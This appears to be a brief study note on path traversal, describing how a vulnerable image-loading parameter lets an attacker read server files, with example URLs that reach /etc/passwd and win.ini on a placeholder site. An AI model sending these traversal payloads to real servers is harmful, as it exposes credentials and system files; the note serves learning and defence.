# Path traversal AKA directory traversal
- Enable an attacker to read arbitrary files on the server that is running an application.
- eg. Application code and data, Credentials for back-end systems, and Sensitive operating system files.
- ![image](https://github.com/user-attachments/assets/33a3ec3c-b208-4b37-a6f0-fc090413aafc)

# Reading arbitrary files via path traversal:
- Original: `<img src="/loadImage?filename=218.png">`
- Linux: `https://insecure-website.com/loadImage?filename=../../../etc/passwd`
- Windows: `https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini`

> On Windows, both ../ and ..\ are valid directory traversal sequences. 



